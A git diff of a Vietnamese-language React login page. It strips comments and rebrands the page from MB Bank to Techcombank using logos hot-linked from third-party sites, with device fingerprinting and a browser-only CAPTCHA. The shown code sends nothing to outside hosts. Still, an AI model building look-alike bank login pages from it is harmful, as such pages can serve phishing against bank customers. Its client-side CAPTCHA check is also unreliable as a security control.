@@ -1,22 +1,21 @@
 import { useState, useEffect } from "react";
-import { useAuth } from "../../context/context"; // Đảm bảo đường dẫn đúng
+import { useAuth } from "../../context/context";
 import "./Login.css";
-import FingerprintJS from '@fingerprintjs/fingerprintjs'; // Import FingerprintJS
+import FingerprintJS from '@fingerprintjs/fingerprintjs';
 
 export default function Login() {
-  const { login, verifyLogin } = useAuth(); // Destructure verifyLogin từ useAuth
+  const { login, verifyLogin } = useAuth();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [userCaptchaInput, setUserCaptchaInput] = useState("");
   const [randomCaptcha, setRandomCaptcha] = useState("");
   const [error, setError] = useState("");
   const [captchaError, setCaptchaError] = useState("");
-  const [deviceId, setDeviceId] = useState(null); // State để lưu device ID
-  const [showVerification, setShowVerification] = useState(false); // State để kiểm soát hiển thị input mã xác minh
-  const [verificationCode, setVerificationCode] = useState(""); // State cho input mã xác minh
-  const [tempUsername, setTempUsername] = useState(""); // Lưu username tạm thời cho bước xác minh
+  const [deviceId, setDeviceId] = useState(null);
+  const [showVerification, setShowVerification] = useState(false);
+  const [verificationCode, setVerificationCode] = useState("");
+  const [tempUsername, setTempUsername] = useState("");
 
-  // Hàm tạo chuỗi CAPTCHA ngẫu nhiên
   const generateCaptcha = () => {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     let result = "";
@@ -25,11 +24,10 @@ export default function Login() {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
     }
     setRandomCaptcha(result);
-    setUserCaptchaInput(""); // Xóa input của người dùng khi tạo CAPTCHA mới
-    setCaptchaError(""); // Xóa lỗi CAPTCHA cũ
+    setUserCaptchaInput("");
+    setCaptchaError("");
   };
 
-  // Tạo CAPTCHA và lấy deviceId khi component được mount
   useEffect(() => {
     generateCaptcha();
     const loadFingerprint = async () => {
@@ -39,8 +37,7 @@ export default function Login() {
         setDeviceId(result.visitorId);
       } catch (err) {
         console.error("Error loading FingerprintJS:", err);
-        // Xử lý lỗi, có thể đặt một deviceId mặc định hoặc hiển thị thông báo
-        setDeviceId("unknown_device"); // Fallback nếu không lấy được deviceId
+        setDeviceId("unknown_device");
       }
     };
     loadFingerprint();
@@ -49,22 +46,19 @@ export default function Login() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    // Kiểm tra CAPTCHA trước khi gửi form
     if (userCaptchaInput.toLowerCase() !== randomCaptcha.toLowerCase()) {
       setCaptchaError("Mã kiểm tra không đúng.");
-      setError(""); // Xóa lỗi API nếu có
+      setError("");
       return;
     }
 
-    setCaptchaError(""); // Xóa lỗi CAPTCHA nếu đúng
-    setError(""); // Xóa lỗi API trước khi gọi login
+    setCaptchaError("");
+    setError("");
 
     if (showVerification) {
-      // Xử lý khi đang ở chế độ xác minh mã
       const result = await verifyLogin(tempUsername, verificationCode, deviceId);
       if (result.success) {
-        alert("Đăng nhập thành công!"); // Thay thế bằng chuyển hướng thực tế
-        // Reset tất cả các trạng thái sau khi đăng nhập thành công
+        alert("Đăng nhập thành công!");
         setUsername("");
         setPassword("");
         setUserCaptchaInput("");
@@ -77,11 +71,9 @@ export default function Login() {
         setError(result.message);
       }
     } else {
-      // Xử lý đăng nhập ban đầu
       const result = await login(username, password, deviceId);
       if (result.success) {
-        alert("Đăng nhập thành công!"); // Thay thế bằng chuyển hướng thực tế
-        // Reset trạng thái sau khi đăng nhập thành công
+        alert("Đăng nhập thành công!");
         setUsername("");
         setPassword("");
         setUserCaptchaInput("");
@@ -89,13 +81,12 @@ export default function Login() {
         generateCaptcha();
       } else {
         if (result.errorType === "New equipment") {
-          // Nếu là thiết bị mới, chuyển sang chế độ xác minh
           setShowVerification(true);
-          setTempUsername(username); // Lưu username để dùng cho bước xác minh
-          setError(result.message); // Hiển thị thông báo về thiết bị mới
-          setPassword(""); // Xóa mật khẩu để bảo mật
-          setUserCaptchaInput(""); // Xóa input captcha
-          generateCaptcha(); // Tạo captcha mới cho bước xác minh
+          setTempUsername(username);
+          setError(result.message);
+          setPassword("");
+          setUserCaptchaInput("");
+          generateCaptcha();
         } else {
           setError(result.message);
         }
@@ -103,7 +94,6 @@ export default function Login() {
     }
   };
 
-  // Xác định trạng thái disabled của nút đăng nhập
   const isLoginButtonDisabled =
     (showVerification && (!tempUsername || !verificationCode || !userCaptchaInput || userCaptchaInput.toLowerCase() !== randomCaptcha.toLowerCase())) ||
     (!showVerification && (!username || !password || !userCaptchaInput || userCaptchaInput.toLowerCase() !== randomCaptcha.toLowerCase()));
@@ -111,16 +101,16 @@ export default function Login() {
   return (
     <div className="login-wrapper">
       <div className="login-left">
-        <img src="https://online.mbbank.com.vn/back-ground-login-1.650d9a73937776ef.jpg" alt="ekyc" className="ekyc-img" />
+        <img src="https://cdn2.tuoitre.vn/thumb_w/1200/471584752817336320/2023/9/26/photo1695689906986-16956899071891462962817.jpg" alt="ekyc" className="ekyc-img" />
       </div>
       <div className="login-right">
         <div className="login-form-wrapper">
           <div className="login-form">
-            <img src="https://online.mbbank.com.vn/assets/images/logo-blue.svg" alt="MB Bank Logo" className="logo" />
+            <img src="https://img7.thuthuatphanmem.vn/uploads/2023/07/06/mau-logo-techcombank-dep_045648494.png" alt="TCB Logo" className="logo" />
             <h3>Chào mừng bạn đến với</h3>
-            <h2><strong>MB Internet Banking</strong></h2>
+            <h2><strong>TCB Internet Banking</strong></h2>
             {error && <p className="error">{error}</p>}
-            {captchaError && <p className="error">{captchaError}</p>} {/* Hiển thị lỗi CAPTCHA */}
+            {captchaError && <p className="error">{captchaError}</p>}
             <form onSubmit={handleSubmit}>
               <input
                 type="text"
@@ -128,9 +118,9 @@ export default function Login() {
                 value={username}
                 onChange={(e ) => setUsername(e.target.value)}
                 required
-                disabled={showVerification} // Vô hiệu hóa input username khi đang xác minh
+                disabled={showVerification}
               />
-              {!showVerification && ( // Chỉ hiển thị input mật khẩu khi không ở chế độ xác minh
+              {!showVerification && (
                 <input
                   type="password"
                   placeholder="Nhập mật khẩu"
@@ -139,8 +129,7 @@ export default function Login() {
                   required
                 />
               )}
-
-              {showVerification && ( // Hiển thị input mã xác minh khi cần
+              {showVerification && (
                 <input
                   type="text"
                   placeholder="Mã xác minh từ Email"
@@ -149,9 +138,7 @@ export default function Login() {
                   required
                 />
               )}
-
               <div className="captcha-row">
-                {/* Hiển thị CAPTCHA ngẫu nhiên */}
                 <div className="captcha-display">{randomCaptcha}</div>
                 <input
                   type="text"
